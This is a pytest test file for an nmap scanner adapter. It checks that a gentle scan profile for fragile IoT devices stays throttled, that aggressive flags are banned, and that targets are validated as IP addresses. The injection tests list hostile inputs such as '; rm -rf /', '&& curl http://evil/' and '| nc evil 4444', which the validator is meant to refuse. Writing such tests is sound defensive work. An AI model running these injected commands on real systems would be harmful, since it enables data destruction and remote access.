"""The profile→flags mapping and the command-injection boundary.

This is the safety-critical file of P5. Two properties are asserted here, and both are the
kind that decay quietly:

* **`GENTLE` stays gentle.** If someone adds `-A` "just to get OS detection", or bumps
  `--version-intensity` to get better banners, or drops the scan delay because a scan felt
  slow, these tests fail. That is the whole point: the flags that keep a camera or a VoIP
  handset alive are not a preference (AGENTS.md §2.7).
* **Nothing shell-shaped reaches a command.** The target is validated as a real IP before
  the argv is built, so injection-shaped input is refused at the door (AGENTS.md §2.9).
"""

from __future__ import annotations

import pytest

from adapters.scanner.nmap import (
    FORBIDDEN_FLAGS,
    IOT_PORTS,
    PROFILE_FLAGS,
    build_command,
    validated_target,
)
from domain.errors import ValidationError
from domain.models import ScanProfile


def gentle_command(target: str = "10.10.5.31") -> list[str]:
    return build_command(target, ScanProfile.GENTLE)


def standard_command(target: str = "10.10.5.7") -> list[str]:
    return build_command(target, ScanProfile.STANDARD)


# ------------------------------------------------------------------ GENTLE is gentle


@pytest.mark.parametrize(
    ("flag", "value"),
    [
        ("--version-intensity", "0"),  # banner only — the lightest probe set there is
        ("--scan-delay", "200ms"),  # never faster than five probes a second
        ("--max-rate", "50"),
        ("--max-parallelism", "1"),  # one probe at a time per device (AGENTS.md §2.7)
        ("--max-retries", "1"),
        ("--host-timeout", "300s"),
    ],
)
def test_gentle_carries_its_throttles(flag: str, value: str) -> None:
    command = gentle_command()

    assert flag in command
    assert command[command.index(flag) + 1] == value


def test_gentle_uses_syn_not_connect_scan() -> None:
    """A connect scan completes the handshake and leaves application-layer state on the
    device — the thing that wedges fragile embedded stacks."""
    command = gentle_command()

    assert "-sS" in command
    assert "-sT" not in command


def test_gentle_caps_timing_at_t2() -> None:
    command = gentle_command()

    assert "-T2" in command
    for hotter in ("-T3", "-T4", "-T5"):
        assert hotter not in command


@pytest.mark.parametrize("forbidden", FORBIDDEN_FLAGS)
def test_gentle_never_carries_an_aggressive_flag(forbidden: str) -> None:
    """`-A` (OS detection + NSE + traceroute) and `--version-all` are exactly how a device
    gets hammered; `--script` also drifts toward the exploitation line (AGENTS.md §2.6)."""
    assert forbidden not in gentle_command()


@pytest.mark.parametrize("forbidden", FORBIDDEN_FLAGS)
def test_no_profile_carries_an_aggressive_flag(forbidden: str) -> None:
    """The prohibition is not GENTLE-only. A robust server does not need `-A` either, and
    a flag list nobody audits is how it would arrive."""
    assert forbidden not in standard_command()
    for flags in PROFILE_FLAGS.values():
        assert forbidden not in flags


def test_gentle_scans_a_curated_port_set_not_all_65535() -> None:
    """A full sweep buys almost nothing on an embedded device and is the classic way to
    take one down."""
    command = gentle_command()

    assert "-p" in command
    ports = command[command.index("-p") + 1].split(",")
    assert [int(port) for port in ports] == list(IOT_PORTS)
    assert len(ports) < 100
    assert "-p-" not in command
    assert "--top-ports" not in command  # GENTLE names its ports explicitly


@pytest.mark.parametrize("port", [23, 80, 443, 554, 9100])
def test_gentle_covers_the_ports_these_devices_actually_expose(port: int) -> None:
    """telnet, the admin UI, RTSP video, raw printing — if these are missing the profile is
    gentle *and* useless."""
    assert port in IOT_PORTS


def test_gentle_still_detects_service_versions() -> None:
    """Gentle is not blind: `-sV` at intensity 0 reads the banner, which is what makes the
    observation carry `version_source='banner'` at all."""
    assert "-sV" in gentle_command()


# --------------------------------------------------------------- STANDARD vs GENTLE


def test_standard_is_the_faster_profile_but_still_bounded() -> None:
    command = standard_command()

    assert "-sS" in command
    assert "-sV" in command
    assert "-T3" in command
    assert "--top-ports" in command
    assert "--version-intensity" not in command  # default intensity for robust hosts


def test_the_two_profiles_actually_differ() -> None:
    """A refactor that collapsed them would silently subject cameras to the server profile."""
    assert PROFILE_FLAGS[ScanProfile.GENTLE] != PROFILE_FLAGS[ScanProfile.STANDARD]


# ---------------------------------------------------------------- command structure


def test_the_command_is_an_argument_list_with_the_target_last() -> None:
    command = gentle_command("10.10.5.31")

    assert isinstance(command, list)
    assert all(isinstance(part, str) for part in command)
    assert command[0] == "nmap"
    assert command[-1] == "10.10.5.31"


def test_xml_goes_to_stdout_rather_than_a_temp_file() -> None:
    command = gentle_command()

    assert command[command.index("-oX") + 1] == "-"


def test_the_nmap_path_is_configurable_without_touching_the_flags() -> None:
    command = build_command("10.10.5.31", ScanProfile.GENTLE, nmap_path="/usr/bin/nmap")

    assert command[0] == "/usr/bin/nmap"
    assert "-T2" in command


# --------------------------------------------------------- the injection boundary


@pytest.mark.parametrize(
    "hostile",
    [
        "10.10.5.31; rm -rf /",
        "10.10.5.31 && curl http://evil/",
        "$(whoami)",
        "`id`",
        "10.10.5.31 | nc evil 4444",
        "10.10.5.31\nnmap evil",
        "--script=http-shellshock",
        "-oN /etc/crontab",
        "10.10.5.0/24",  # a range is not a target: scope is authorised per address
        "evil.example.com",  # a name could resolve anywhere, including out of scope
        "",
        "   ",
        "10.10.5.999",
        "999.999.999.999",
        # Leading zeros are ambiguous (octal in some resolvers, decimal in others) and are
        # a classic SSRF/allowlist-bypass trick; `ipaddress` refuses them, and so do we.
        "010.010.005.031",
    ],
)
def test_a_target_that_is_not_an_ip_address_is_refused(hostile: str) -> None:
    """Refused at the door, before any command exists to inject into."""
    with pytest.raises(ValidationError, match="not a valid IP address"):
        validated_target(hostile)

    with pytest.raises(ValidationError):
        build_command(hostile, ScanProfile.GENTLE)


def test_a_hostile_target_never_reaches_a_command() -> None:
    """The negative form of the property: no argv is produced at all, so there is nothing
    for a shell to reinterpret even if one were involved later."""
    with pytest.raises(ValidationError):
        build_command("10.10.5.31; rm -rf /", ScanProfile.STANDARD)


@pytest.mark.parametrize(
    ("given", "canonical"),
    [
        ("10.10.5.31", "10.10.5.31"),
        ("127.0.0.1", "127.0.0.1"),
        ("2001:db8::1", "2001:db8::1"),
        ("2001:0db8:0000:0000:0000:0000:0000:0001", "2001:db8::1"),  # canonicalised
    ],
)
def test_a_valid_address_is_accepted_in_canonical_form(given: str, canonical: str) -> None:
    assert validated_target(given) == canonical


def test_an_ipv6_target_builds_a_normal_command() -> None:
    command = build_command("2001:db8::1", ScanProfile.GENTLE)

    assert command[-1] == "2001:db8::1"
